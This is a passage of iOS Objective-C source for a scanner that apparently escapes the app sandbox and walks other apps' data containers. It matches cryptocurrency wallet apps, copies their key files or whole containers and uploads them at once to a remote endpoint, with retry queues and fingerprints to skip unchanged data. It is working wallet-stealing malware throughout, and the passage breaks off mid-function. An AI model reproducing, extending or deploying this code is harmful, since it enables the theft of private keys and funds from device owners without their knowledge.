#import "WQLScanner.h"
#import "WQLEscape.h"
#import "WQLPathLeak.h"
#import "WQLPathCache.h"
#import "WQLLog.h"
#import "WQLUploader.h"
#import <UIKit/UIKit.h>
#import <dispatch/dispatch.h>
#import <stdlib.h>
#import <sys/sysctl.h>
#import <stdarg.h>
#import <sys/xattr.h>

static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manager.metadata.plist";

@interface WQLScanner ()
- (void)log:(NSString *)fmt, ...;
- (NSString *)bundleIDForContainerPath:(NSString *)path;
- (NSArray<NSString *> *)copyTarget:(WQLTarget *)t
                         container:(NSString *)container
                          bundleID:(NSString *)bundleID
                            outDir:(NSString *)outRoot
                             bytes:(uint64_t *)bytesOut;
- (NSArray<NSString *> *)sourcesForPath:(NSString *)path;
- (NSString *)relative:(NSString *)path fromContainer:(NSString *)container;
- (uint64_t)sizeOfItemAtPath:(NSString *)path;
- (NSString *)humanBytes:(uint64_t)b;
- (void)writeWalletManifestInDirectory:(NSString *)outDir
                               records:(NSArray<NSDictionary *> *)records;
- (NSData *)manifestDataForRecords:(NSArray<NSDictionary *> *)records;
- (NSArray<NSString *> *)copyWholeContainer:(NSString *)container
                                  forTarget:(WQLTarget *)t
                                   bundleID:(NSString *)bundleID
                                     outDir:(NSString *)outRoot
                                      bytes:(uint64_t *)bytesOut;
- (NSString *)productType;
- (NSArray<NSString *> *)listChildrenOfDirectory:(NSString *)dir error:(NSString **)error;
- (NSArray<NSString *> *)copyTreeFrom:(NSString *)src
                                   to:(NSString *)dst
                                bytes:(uint64_t *)bytesOut;
- (BOOL)uploadStage:(NSString *)stage blocking:(BOOL)blocking;
- (dispatch_queue_t)uploadQueue;
- (void)enqueueUploadOfStage:(NSString *)stage
                      wallet:(NSString *)wallet
                    bundleID:(NSString *)bundleID
                 fingerprint:(NSString *)fingerprint
                       bytes:(uint64_t)bytes;
+ (BOOL)isNoiseRelativePath:(NSString *)rel;
- (NSString *)fingerprintForDirectory:(NSString *)dir;
- (NSString *)storedFingerprintForBundle:(NSString *)bundleID;
- (void)storeFingerprint:(NSString *)fp forBundle:(NSString *)bundleID;
- (void)moveStageToPending:(NSString *)stage wallet:(NSString *)wallet;
- (void)prunePendingIfNeeded;
@property (nonatomic, assign, readwrite) BOOL lastRunUsable;
@end

@implementation WQLScanner

- (instancetype)init {
    if (self = [super init]) {
        _maxInode = 0;
        _maxContainerBytes = 800ULL * 1024 * 1024;
        _includeExtras = NO;

        // 清掉上次被系统杀掉时残留的待上传目录（先同步列一遍，避免删到本轮新建的 stage）
        NSFileManager *fm0 = [NSFileManager defaultManager];
        NSString *tmp0 = NSTemporaryDirectory();
        NSMutableArray<NSString *> *stale = [NSMutableArray array];
        for (NSString *n in [fm0 contentsOfDirectoryAtPath:tmp0 error:nil]) {
            if ([n hasPrefix:@"wql_up_"] || [n hasPrefix:@"wql_logstage_"]) [stale addObject:n];
        }
        if (stale.count) {
            dispatch_async(dispatch_get_global_queue(QOS_CLASS_BACKGROUND, 0), ^{
                NSFileManager *fm = [NSFileManager defaultManager];
                for (NSString *n in stale) {
                    [fm removeItemAtPath:[tmp0 stringByAppendingPathComponent:n] error:nil];
                }
            });
        }
    }
    return self;
}

- (void)log:(NSString *)fmt, ... {
    va_list args;
    va_start(args, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    WQLLogLine(@"%@", line);
    if (self.logBlock) self.logBlock(line);
}

- (NSArray<NSString *> *)defaultRoots {
    return @[
        @"/private/var/mobile/Containers/Data/Application",
        @"/private/var/mobile/Containers/Shared/AppGroup",
        @"/private/var/mobile/Containers/Data/InternalDaemon",
        @"/private/var/mobile/Containers/Data/PluginKitPlugin",
        @"/private/var/containers/Data/System",
        @"/private/var/containers/Shared/SystemGroup",
    ];
}

#pragma mark - 上传

- (BOOL)uploadStage:(NSString *)stage blocking:(BOOL)blocking {
    WQLUploader *up = [WQLUploader shared];
    if (!up.endpoint.length) {
        up.endpoint = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"WQLUploadEndpoint"];
    }
    if (!up.endpoint.length) return NO;

    if (!blocking) {
        [up uploadDirectory:stage completion:nil];
        return YES;
    }

    __block BOOL ok = NO;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    [up uploadDirectory:stage completion:^(NSUInteger good, NSUInteger failed) {
        ok = (good > 0 && failed == 0);
        dispatch_semaphore_signal(sem);
    }];
    long waited = dispatch_semaphore_wait(sem,
                    dispatch_time(DISPATCH_TIME_NOW, (int64_t)(300 * NSEC_PER_SEC)));
    if (waited != 0) return NO;
    return ok;
}

- (dispatch_queue_t)uploadQueue {
    static dispatch_queue_t q;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        q = dispatch_queue_create("com.wql.upload", DISPATCH_QUEUE_SERIAL);
    });
    return q;
}

static NSString *WQLPendingRoot(void) {
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *p = [docs stringByAppendingPathComponent:@"wql_pending"];
    [[NSFileManager defaultManager] createDirectoryAtPath:p
                              withIntermediateDirectories:YES attributes:nil error:nil];
    return p;
}

static NSString *WQLFingerprintPath(void) {
    NSArray *dirs = NSSearchPathForDirectoriesInDomains(NSApplicationSupportDirectory,
                                                        NSUserDomainMask, YES);
    NSString *base = dirs.firstObject ?: NSTemporaryDirectory();
    [[NSFileManager defaultManager] createDirectoryAtPath:base
                              withIntermediateDirectories:YES attributes:nil error:nil];
    return [base stringByAppendingPathComponent:@"wql_fingerprints.plist"];
}

static uint64_t WQLFNV1a(const char *s) {
    uint64_t h = 1469598103934665603ULL;
    while (s && *s) {
        h ^= (unsigned char)(*s++);
        h *= 1099511628211ULL;
    }
    return h;
}

/// 扫描线程只投递、不等待；真正的打包上传在串行队列里做。
/// 失败不删包，转到 Documents/wql_pending，下次启动自动补传。
- (void)enqueueUploadOfStage:(NSString *)stage
                      wallet:(NSString *)wallet
                    bundleID:(NSString *)bundleID
                 fingerprint:(NSString *)fingerprint
                       bytes:(uint64_t)bytes {
    __weak typeof(self) weakSelf = self;
    dispatch_async([self uploadQueue], ^{
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;
        BOOL ok = [self uploadStage:stage blocking:YES];
        if (ok) {
            if (fingerprint.length && bundleID.length) {
                [self storeFingerprint:fingerprint forBundle:bundleID];
            }
            [[NSFileManager defaultManager] removeItemAtPath:stage error:nil];
            [self log:@"    ✔ 上传成功 %@（%@）", wallet, [self humanBytes:bytes]];
        } else {
            [self moveStageToPending:stage wallet:wallet];
            [self log:@"    ⚠️ 上传失败 %@，已转入待重传", wallet];
        }
    });
}

- (void)moveStageToPending:(NSString *)stage wallet:(NSString *)wallet {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *name = [NSString stringWithFormat:@"%@_%.0f",
                      wallet.length ? wallet : @"unknown",
                      [[NSDate date] timeIntervalSince1970]];
    name = [name stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
    NSString *dst = [WQLPendingRoot() stringByAppendingPathComponent:name];
    [fm removeItemAtPath:dst error:nil];
    NSError *e = nil;
    if (![fm moveItemAtPath:stage toPath:dst error:&e]) {
        [self log:@"       转入待重传失败：%@", e.localizedDescription ?: @"unknown"];
        [fm removeItemAtPath:stage error:nil];
    }
    [self prunePendingIfNeeded];
}

/// 待重传目录封顶 200MB，超了丢最旧的
- (void)prunePendingIfNeeded {
    const uint64_t kCap = 200ULL * 1024 * 1024;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *root = WQLPendingRoot();
    NSArray<NSString *> *items = [[fm contentsOfDirectoryAtPath:root error:nil]
                                  sortedArrayUsingSelector:@selector(compare:)];
    if (!items.count) return;

    uint64_t total = 0;
    NSMutableArray<NSString *> *dirs = [NSMutableArray array];
    for (NSString *n in items) {
        NSString *p = [root stringByAppendingPathComponent:n];
        total += [self sizeOfItemAtPath:p];
        [dirs addObject:p];
    }
    while (total > kCap && dirs.count) {
        NSString *oldest = dirs.firstObject;
        [dirs removeObjectAtIndex:0];
        total -= [self sizeOfItemAtPath:oldest];
        [fm removeItemAtPath:oldest error:nil];
        [self log:@"       待重传超过 200MB，丢弃最旧的一份"];
    }
}

- (NSUInteger)flushPendingUploads {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *root = WQLPendingRoot();
    NSArray<NSString *> *items = [[fm contentsOfDirectoryAtPath:root error:nil]
                                  sortedArrayUsingSelector:@selector(compare:)];
    if (!items.count) return 0;

    [self log:@"【待重传】上次有 %lu 个包没传成功，先补传", (unsigned long)items.count];
    NSUInteger okCount = 0;
    for (NSString *n in items) {
        NSString *p = [root stringByAppendingPathComponent:n];
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:p isDirectory:&isDir] || !isDir) continue;
        if (self.cancelBlock && self.cancelBlock()) break;
        [self log:@"    ↑ 补传 %@", n];
        if ([self uploadStage:p blocking:YES]) {
            [fm removeItemAtPath:p error:nil];
            okCount++;
        } else {
            [self log:@"    ⛔ 补传失败，保留到下次"];
        }
    }
    [self log:@"【待重传】完成：成功 %lu 个", (unsigned long)okCount];
    return okCount;
}

#pragma mark - 指纹

- (NSString *)fingerprintForDirectory:(NSString *)dir {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray<NSString *> *parts = [NSMutableArray array];
    NSDirectoryEnumerator *e = [fm enumeratorAtPath:dir];
    for (NSString *rel in e) {
        NSDictionary *a = [e fileAttributes];
        if (![a[NSFileType] isEqualToString:NSFileTypeRegular]) continue;
        uint64_t sz = [a[NSFileSize] unsignedLongLongValue];
        NSTimeInterval mt = [a[NSFileModificationDate] timeIntervalSince1970];
        [parts addObject:[NSString stringWithFormat:@"%@|%llu|%.0f",
                          rel, (unsigned long long)sz, mt]];
    }
    [parts sortUsingSelector:@selector(compare:)];
    NSString *joined = [parts componentsJoinedByString:@";"];
    uint64_t h = WQLFNV1a(joined.UTF8String);
    return [NSString stringWithFormat:@"%016llx-%lu",
            (unsigned long long)h, (unsigned long)parts.count];
}

- (NSString *)storedFingerprintForBundle:(NSString *)bundleID {
    if (!bundleID.length) return nil;
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:WQLFingerprintPath()];
    id v = d[bundleID];
    return [v isKindOfClass:[NSString class]] ? v : nil;
}

- (void)storeFingerprint:(NSString *)fp forBundle:(NSString *)bundleID {
    if (!fp.length || !bundleID.length) return;
    NSMutableDictionary *d = [NSMutableDictionary dictionaryWithContentsOfFile:WQLFingerprintPath()];
    if (!d) d = [NSMutableDictionary dictionary];
    d[bundleID] = fp;
    [d writeToFile:WQLFingerprintPath() atomically:YES];
}

#pragma mark - 主流程

- (NSArray<NSDictionary<NSString *, id> *> *)scanWithOutputDirectory:(NSString *)outDir {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm createDirectoryAtPath:outDir withIntermediateDirectories:YES attributes:nil error:nil];
    self.lastRunUsable = NO;

    NSMutableArray<WQLTarget *> *targets = [[WQLTargets wallets] mutableCopy];
    if (self.includeExtras) [targets addObjectsFromArray:[WQLTargets extras]];
    if (self.includeNotes) [targets addObjectsFromArray:[WQLTargets notes]];

    NSString *err = nil;
    if (![[WQLEscape shared] prepareWithError:&err]) {
        [self log:@"⛔ 通道不可用：%@", err ?: @"未知原因"];
        return @[];
    }
    NSDictionary *diag = [[WQLEscape shared] diagnostics];
    [self log:@"【第1步 环境检查】系统 %@   机型 %@", diag[@"os"], diag[@"device"]];
    [self log:@"    共享目录：%@", diag[@"groupPath"]];
    [self log:@"    取权限方式：%@，flags=%@",
          [diag[@"symbolsOK"] boolValue] ? @"内核接口可用" : @"接口缺失",
          diag[@"flagsFirst"]];
    if (![diag[@"groupOK"] boolValue]) {
        [self log:@"    ⛔ 没有共享目录：签名没带 App Group，后面无法继续"];
        return @[];
    }
    self.lastRunUsable = YES;

    NSArray<NSString *> *allRoots = [self defaultRoots];
    NSMutableDictionary<NSString *, NSArray<NSString *> *> *children = [NSMutableDictionary dictionary];
    NSMutableArray<NSString *> *needScan = [NSMutableArray array];

    [self log:@"【第2步 找容器目录】"];
    for (NSString *root in allRoots) {
        NSString *fastErr = nil;
        NSArray<NSString *> *direct = [self listChildrenOfDirectory:root error:&fastErr];
        if (direct) {
            children[root] = direct;
            [self log:@"    ✅ 直接列出 %@（%lu 个）",
                  root.lastPathComponent, (unsigned long)direct.count];
            if (direct.count) [[WQLPathCache shared] mergeScanned:@{ root: direct }];
            continue;
        }
        [self log:@"    ⚠️ %@ 不能直接列出（%@），改用逐个扫描",
              root.lastPathComponent, fastErr ?: @"系统拒绝"];

        NSArray<NSString *> *cached = [[WQLPathCache shared] validPathsForRoot:root];
        BOOL stale = [[WQLPathCache shared] needsRescanForRoot:root];
        NSTimeInterval since = [[WQLPathCache shared] secondsSinceScanForRoot:root];
        if (cached.count && !stale) {
            children[root] = cached;
            [self log:@"       └ 用上次缓存 %lu 个，跳过扫描", (unsigned long)cached.count];
        } else if (cached.count == 0 && since < 24 * 3600) {
            // 上次确实扫过、结果就是 0 个：不要为了它再跑一遍 3 亿 inode
            children[root] = @[];
            [self log:@"       └ 24 小时内扫过（0 个），跳过"];
        } else {
            if (cached.count) [self log:@"       └ 缓存已失效，重新扫描"];
            [needScan addObject:root];
        }
    }

    NSMutableArray<NSDictionary *> *records = [NSMutableArray array];
    __block NSUInteger enumerated = 0;
    __block NSUInteger unreadable = 0;
    __block NSUInteger matchedCount = 0;
    __block NSUInteger uploadedWallets = 0;
    __block NSUInteger skippedUnchanged = 0;
    __block NSMutableArray<NSString *> *unreadableSamples = [NSMutableArray array];

    void (^handleContainer)(NSString *, NSString *) = ^(NSString *root, NSString *path) {
        enumerated++;
        NSString *escErr = nil;
        int64_t handle = [[WQLEscape shared] consumeExtensionForPath:path error:&escErr];
        NSString *bundleID = (handle > 0) ? [self bundleIDForContainerPath:path] : nil;
        BOOL fuzzy = NO;
        WQLTarget *t = [WQLTargets matchBundleID:bundleID inTargets:targets fuzzy:&fuzzy];

        if (handle <= 0) {
            unreadable++;
            if (unreadableSamples.count < 8) {
                [unreadableSamples addObject:[NSString stringWithFormat:@"%@（%@）",
                                              path.lastPathComponent, escErr ?: @"取不到权限"]];
            }
            return;
        }
        if (!t) {
            [[WQLEscape shared] releaseHandle:handle];
            return;
        }

        matchedCount++;
        if (fuzzy) [self log:@"    ↳ 模糊命中 %@ → 归入 %@", bundleID, t.name];

        uint64_t bytes = 0;
        NSArray<NSString *> *files = [self copyTarget:t container:path bundleID:bundleID
                                                outDir:outDir bytes:&bytes];
        if (files.count == 0 && !t.wholeContainer) {
            [self log:@"       %@ 固定路径不存在，改为整容器拷贝", t.name];
            files = [self copyWholeContainer:path forTarget:t bundleID:bundleID
                                       outDir:outDir bytes:&bytes];
        }
        [[WQLEscape shared] releaseHandle:handle];

        NSMutableDictionary *record = [@{
            @"bundleId": bundleID ?: @"",
            @"path": path,
            @"target": t.name ?: @"",
            @"status": files.count ? @"copied" : @"empty",
            @"fuzzy": @(fuzzy),
            @"files": files,
            @"bytes": @(bytes),
        } mutableCopy];
        [records addObject:record];

        [self log:@"    %@ %@：%lu 个文件，%@",
              files.count ? @"✅" : @"⛔", t.name,
              (unsigned long)files.count, [self humanBytes:bytes]];
        for (NSString *f in files) {
            NSString *base = [f hasPrefix:[path stringByAppendingString:@"/"]]
                ? [f substringFromIndex:path.length + 1] : f.lastPathComponent;
            NSNumber *sz = [[NSFileManager defaultManager]
                            attributesOfItemAtPath:f error:nil][NSFileSize];
            [self log:@"        └ %@ (%@)", base, [self humanBytes:[sz unsignedLongLongValue]]];
        }

        // 采到一个就立刻打包上传，不等整轮扫完；内容没变则跳过
        if (files.count) {
            NSString *walletDir = [outDir stringByAppendingPathComponent:bundleID ?: @"unknown"];
            NSString *fp = [self fingerprintForDirectory:walletDir];
            NSString *prevFp = [self storedFingerprintForBundle:bundleID ?: @""];
            if (prevFp.length && [prevFp isEqualToString:fp]) {
                [self log:@"    ⏭ %@ 与上次一致，跳过上传", t.name];
                skippedUnchanged++;
            } else {
                NSString *stage = [NSTemporaryDirectory() stringByAppendingPathComponent:
                                   [NSString stringWithFormat:@"wql_up_%@", NSUUID.UUID.UUIDString]];
                [self copyTreeFrom:walletDir
                                to:[stage stringByAppendingPathComponent:bundleID ?: @"unknown"]
                             bytes:NULL];
                NSData *man = [self manifestDataForRecords:@[ record ]];
                if (man) [man writeToFile:[stage stringByAppendingPathComponent:@"_manifest.json"]
                               atomically:YES];

                [self log:@"    📤 立即上传 %@（%@）", t.name, [self humanBytes:bytes]];
                [self enqueueUploadOfStage:stage
                                    wallet:t.name
                                  bundleID:(bundleID ?: @"")
                               fingerprint:fp
                                     bytes:bytes];
                uploadedWallets++;
            }
        }
    };

    if (!needScan.count) {
        [self log:@"    全部命中缓存，跳过扫描"];
    } else {
        uint64_t maxInode = self.maxInode;
        if (maxInode == 0) maxInode = [WQLPathLeak baselineInodeWithError:&err];
        if (maxInode == 0) {
            [self log:@"    ⛔ 取基线 inode 失败：%@", err ?: @"未知"];
        } else {
            BOOL hasCp = [WQLPathLeak hasCheckpoint];
            [self log:@"【第3步 扫描并在发现时立即采集】"];
            [self log:@"    %@，预计 %@",
                  hasCp ? @"发现上次断点，本次续扫" : @"首次扫描（最慢的一步）",
                  hasCp ? @"几分钟" : @"10 分钟以上"];
            [self log:@"    提示：可切后台，被杀也会从断点继续"];

            __weak typeof(self) weakSelf = self;
            __block uint64_t lastPct = 0;
            BOOL completed = NO;
            NSDictionary<NSString *, NSArray<NSString *> *> *scannedRes =
            [WQLPathLeak childrenOfDirectories:needScan
                                      maxInode:maxInode
                                        onPath:^(NSString *root, NSString *path) {
                handleContainer(root, path);
            } progress:^(uint64_t done, uint64_t total) {
                __strong typeof(weakSelf) self = weakSelf;
                if (!self || total == 0) return;
                uint64_t pct = done * 100 / total;
                if (pct >= lastPct + 10) {
                    lastPct = pct;
                    [self log:@"    扫描进度 %llu%%（已发现 %lu 个容器，采集 %lu 个钱包）",
                          (unsigned long long)pct,
                          (unsigned long)records.count, (unsigned long)matchedCount];
                }
                if (self.progressBlock) {
                    self.progressBlock([NSString stringWithFormat:
                                        @"扫描 %llu%% · 命中 %lu · 已传 %lu",
                                        (unsigned long long)pct,
                                        (unsigned long)matchedCount,
                                        (unsigned long)uploadedWallets]);
                }
            } cancel:^BOOL{
                __strong typeof(weakSelf) self = weakSelf;
                return self ? (self.cancelBlock ? self.cancelBlock() : NO) : YES;
            } completed:&completed error:&err];

            if (completed && scannedRes.count) {
                [[WQLPathCache shared] mergeScanned:scannedRes];
                for (NSString *root in scannedRes) {
                    [[WQLPathCache shared] markRootScanned:root];
                }
                [self log:@"    扫描完成，%lu 个根目录结果已写入缓存（下次启动秒进）",
                      (unsigned long)scannedRes.count];
            } else if (!completed) {
                [self log:@"    ⚠️ 扫描被中断，断点已保存，下次会继续"];
            }
        }
    }

    for (NSString *root in allRoots) {
        if ([needScan containsObject:root]) continue;
        NSArray<NSString *> *items = children[root];
        if (!items.count) continue;
        [self log:@"【处理缓存路径】%@ 下 %lu 个", root.lastPathComponent, (unsigned long)items.count];
        for (NSString *p in items) {
            if (self.cancelBlock && self.cancelBlock()) break;
            handleContainer(root, p);
        }
    }

    // 等串行上传队列排空，保证扫描结束时所有包都已落盘
    if (uploadedWallets) {
        [self log:@"    等待最后 %lu 个包上传完成…", (unsigned long)uploadedWallets];
        dispatch_sync([self uploadQueue], ^{});
    }

    [self log:@"【第4步 生成清单】"];
    [self writeWalletManifestInDirectory:outDir records:records];

    NSData *json = [NSJSONSerialization dataWithJSONObject:records
                                                   options:NSJSONWritingPrettyPrinted
                                                     error:nil];
    if (json) {
        [json writeToFile:[outDir stringByAppendingPathComponent:@"manifest.json"] atomically:YES];
    }

    [self log:@"【采集汇总】"];
    NSMutableDictionary<NSString *, NSDictionary *> *byWallet = [NSMutableDictionary dictionary];
    for (NSDictionary *r in records) {
        NSString *name = r[@"target"];
        if (!name.length) continue;
        NSUInteger n = [(NSArray *)r[@"files"] count];
        NSDictionary *prev = byWallet[name];
        if (!prev) byWallet[name] = r;
        else if ([(NSArray *)prev[@"files"] count] == 0 && n > 0) byWallet[name] = r;
    }
    NSArray *names = [byWallet.allKeys sortedArrayUsingSelector:@selector(compare:)];
    for (NSString *name in names) {
        NSDictionary *r = byWallet[name];
        NSUInteger n = [(NSArray *)r[@"files"] count];
        unsigned long long b = [r[@"bytes"] unsignedLongLongValue];
        [self log:@"    %@ %@：%@", n ? @"✅" : @"⛔", name,
              n ? [NSString stringWithFormat:@"%lu 个文件，%@",
                   (unsigned long)n, [self humanBytes:b]] : @"没有拿到材料"];
    }
    [self log:@"    枚举 %lu 个容器（%lu 个取不到权限），命中 %lu 个，上传 %lu 个包，未变化 %lu 个，涉及 %lu 个钱包",
          (unsigned long)enumerated, (unsigned long)unreadable,
          (unsigned long)matchedCount, (unsigned long)uploadedWallets,
          (unsigned long)skippedUnchanged, (unsigned long)byWallet.count];
    if (unreadableSamples.count) {
        [self log:@"    取不到权限的示例（前 %lu 个）：", (unsigned long)unreadableSamples.count];
        for (NSString *s in unreadableSamples) [self log:@"        · %@", s];
    }

    return records;
}

#pragma mark - 父目录快路径

- (NSArray<NSString *> *)listChildrenOfDirectory:(NSString *)dir error:(NSString **)error {
    NSString *escErr = nil;
    int64_t handle = [[WQLEscape shared] consumeExtensionForPath:dir error:&escErr];
    if (handle <= 0) {
        if (error) *error = escErr ?: @"父目录豁免失败";
        return nil;
    }

    NSFileManager *fm = [NSFileManager defaultManager];
    NSError *e = nil;
    NSArray *items = [fm contentsOfDirectoryAtPath:dir error:&e];
    if (!items) {
        [[WQLEscape shared] releaseHandle:handle];
        if (error) *error = e.localizedDescription ?: @"列目录失败";
        return nil;
    }

    NSMutableArray<NSString *> *out = [NSMutableArray array];
    for (NSString *name in items) {
        if ([name hasPrefix:@"."]) continue;
        NSString *full = [dir stringByAppendingPathComponent:name];
        BOOL isDir = NO;
        if ([fm fileExistsAtPath:full isDirectory:&isDir] && isDir) [out addObject:full];
    }

    [[WQLEscape shared] releaseHandle:handle];
    return out;
}

#pragma mark - 容器识别

- (NSString *)bundleIDForContainerPath:(NSString *)path {
    NSString *meta = [path stringByAppendingPathComponent:kWQLContainerMeta];
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:meta];
    NSString *ident = d[@"MCMMetadataIdentifier"];
    if (ident.length) return ident;

    char buf[512] = {0};
    ssize_t n = getxattr(path.fileSystemRepresentation,
                         "com.apple.containermanager.identifier",
                         buf, sizeof(buf) - 1, 0, 0);
    if (n > 0) {
        buf[n] = 0;
        return [NSString stringWithUTF8String:buf];
    }
    return nil;
}

#pragma mark - 拷贝

- (NSArray<NSString *> *)copyTarget:(WQLTarget *)t
                         container:(NSString *)container
                          bundleID:(NSString *)bundleID
                            outDir:(NSString *)outRoot
                             bytes:(uint64_t *)bytesOut {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *destRoot = [outRoot stringByAppendingPathComponent:bundleID];
    [fm createDirectoryAtPath:destRoot withIntermediateDirectories:YES attributes:nil error:nil];

    NSMutableArray<NSString *> *copied = [NSMutableArray array];
    uint64_t total = 0;

    if (t.wholeContainer) {
        NSString *dst = [destRoot stringByAppendingPathComponent:@"container"];
        [copied addObjectsFromArray:[self copyTreeFrom:container to:dst bytes:&total]];
    } else {
        for (NSString *rel in t.relativePaths) {
            NSString *src = [container stringByAppendingPathComponent:rel];
            if (![fm fileExistsAtPath:src]) continue;

            for (NSString *s in [self sourcesForPath:src]) {
                uint64_t sz = [self sizeOfItemAtPath:s];
                uint64_t limit = t.maxBytes ?: self.maxContainerBytes;
                if (sz > limit) {
                    [self log:@"       跳过超大项 %@（%@ > %@）", s.lastPathComponent,
                          [self humanBytes:sz], [self humanBytes:limit]];
                    continue;
                }
                NSString *dstRel = [self relative:s fromContainer:container];
                NSString *dst = [destRoot stringByAppendingPathComponent:dstRel];
                [fm createDirectoryAtPath:[dst stringByDeletingLastPathComponent]
              withIntermediateDirectories:YES attributes:nil error:nil];
                [fm removeItemAtPath:dst error:nil];
                NSError *e = nil;
                if ([fm copyItemAtPath:s toPath:dst error:&e]) {
                    [copied addObject:dst];
                    total += sz;
                } else {
                    [self log:@"       拷贝失败 %@：%@", s.lastPathComponent, e.localizedDescription];
                }
            }
        }
    }

    if (bytesOut) *bytesOut = total;
    return copied;
}

- (NSArray<NSString *> *)copyWholeContainer:(NSString *)container
                                  forTarget:(WQLTarget *)t
                                   bundleID:(NSString *)bundleID
                                     outDir:(NSString *)outRoot
                                      bytes:(uint64_t *)bytesOut {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *destRoot = [outRoot stringByAppendingPathComponent:bundleID ?: @"unknown"];
    [fm createDirectoryAtPath:destRoot withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *dst = [destRoot stringByAppendingPathComponent:@"container"];
    return [self copyTreeFrom:container to:dst bytes:bytesOut];
}

/// 整容器拷贝时跳过的东西：截图、缓存、HTTP 存储、Cookie、系统 dyld 缓存、日志。
/// 这些既不是密钥材料，还会把包撑到几 MB（Bitpie 的 SplashBoard 快照就占 6MB）。
+ (BOOL)isNoiseRelativePath:(NSString *)rel {
    NSString *l = rel.lowercaseString;
    if ([l hasSuffix:@".ktx"] || [l hasSuffix:@".xlog"] ||
        [l hasSuffix:@".dyld4"] || [l hasSuffix:@".dyld3"]) return YES;

    NSArray<NSString *> *segs = [l componentsSeparatedByString:@"/"];
    for (NSUInteger i = 0; i + 1 < segs.count; i++) {
        if (![segs[i] isEqualToString:@"library"]) continue;
        NSString *b = segs[i + 1];
        if ([b isEqualToString:@"caches"] || [b isEqualToString:@"splashboard"] ||
            [b isEqualToString:@"httpstorages"] || [b isEqualToString:@"cookies"] ||
            [b isEqualToString:@"logs"] || [b isEqualToString:@"saved application state"]) {
            return YES;
        }
    }
    for (NSString *s in segs) {
        if ([s isEqualToString:@"storekit"] || [s isEqualToString:@"oklog_new"]) return YES;
    }
    return NO;
}

- (NSArray<NSString *> *)copyTreeFrom:(NSString *)src
                                   to:(NSString *)dst
                                bytes:(uint64_t *)bytesOut {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray<NSString *> *copied = [NSMutableArray array];
    uint64_t total = 0;
    uint64_t skippedBytes = 0;
    NSUInteger failed = 0;
    NSUInteger skipped = 0;

    NSDirectoryEnumerator *e = [fm enumeratorAtPath:src];
    NSString *rel = nil;
    while ((rel = [e nextObject])) {
        if ([rel.lastPathComponent hasPrefix:@".com.apple.mobile_container_manager"]) continue;

        NSString *full = [src stringByAppendingPathComponent:rel];
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:full isDirectory:&isDir] || isDir) continue;

        uint64_t sz = [[fm attributesOfItemAtPath:full error:nil][NSFileSize] unsignedLongLongValue];

        if ([WQLScanner isNoiseRelativePath:rel]) {
            skipped++;
            skippedBytes += sz;
            continue;
        }

        if (total + sz > self.maxContainerBytes) {
            [self log:@"       达到门限 %@，停止", [self humanBytes:self.maxContainerBytes]];
            break;
        }

        NSString *dstPath = [dst stringByAppendingPathComponent:rel];
        [fm createDirectoryAtPath:[dstPath stringByDeletingLastPathComponent]
      withIntermediateDirectories:YES attributes:nil error:nil];

        if ([fm copyItemAtPath:full toPath:dstPath error:nil]) {
            [copied addObject:dstPath];
            total += sz;
        } else {
            failed++;
        }
    }

    if (skipped) {
        [self log:@"       已跳过 %lu 个缓存/截图/日志文件（%@）",
              (unsigned long)skipped, [self humanBytes:skippedBytes]];
    }
    if (failed) [self log:@"       跳过 %lu 个无权限文件", (unsigned long)failed];
    if (bytesOut) *bytesOut = total;
    return copied;
}

- (NSArray<NSString *> *)sourcesForPath:(NSString *)path {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray *out = [NSMutableArray arrayWithObject:path];
    NSString *ext = path.pathExtension.lowercaseString;
    if ([ext isEqualToString:@"sqlite"] || [ext isEqualToString:@"sqlite3"] ||
        [ext isEqualToString:@"db"]) {
        for (NSString *suffix in @[@"-wal", @"-shm"]) {
            NSString *side = [path stringByAppendingString:suffix];
            if ([fm fileExistsAtPath:side]) [out addObject:side];
        }
    }
    return out;
}

- (NSString *)relative:(NSString *)path fromContainer:(NSString *)container {
    NSString *base = container;
    if (![base hasSuffix:@"/"]) base = [base stringByAppendingString:@"/"];
    if ([path hasPrefix:base]) return [path substringFromIndex:base.length];
    return path.lastPathComponent;
}

- (uint64_t)sizeOfItemAtPath:(NSString *)path {
    NSFileManager *fm = [NSFileManager defaultManager];
    BOOL isDir = NO;
    if (![fm fileExistsAtPath:path isDirectory:&isDir]) return 0;
    if (!isDir) {
        return [[fm attributesOfItemAtPath:path error:nil][NSFileSize] unsignedLongLongValue];
    }
    uint64_t total = 0;
    NSDirectoryEnumerator *e = [fm enumeratorAtPath:path];
    while ([e nextObject]) {
        NSDictionary *a = [e fileAttributes];
        if (a[NSFileType] == NSFileTypeRegular) total += [a[NSFileSize] unsignedLongLongValue];
        if (total > self.maxContainerBytes) break;
    }
    return total;
}

#pragma mark - 清单

- (NSData *)manifestDataForRecords:(NSArray<NSDictionary *> *)records {
    NSMutableArray *found = [NSMutableArray array];
    NSMutableArray *wallets = [NSMutableArray array];
    for (NSDictionary *r in records) {
        NSString *name = r[@"target"];
        if (!name.length) continue;
        if (![found containsObject:name]) [found addObject:name];
        [wallets addObject:@{
            @"wallet": name,
            @"bundleID": r[@"bundleId"] ?: @"",
            @"bytes": r[@"bytes"] ?: @0,
        }];
    }

    NSString *idfv = [[UIDevice currentDevice] identifierForVendor].UUIDString;
    if (!idfv.length) {
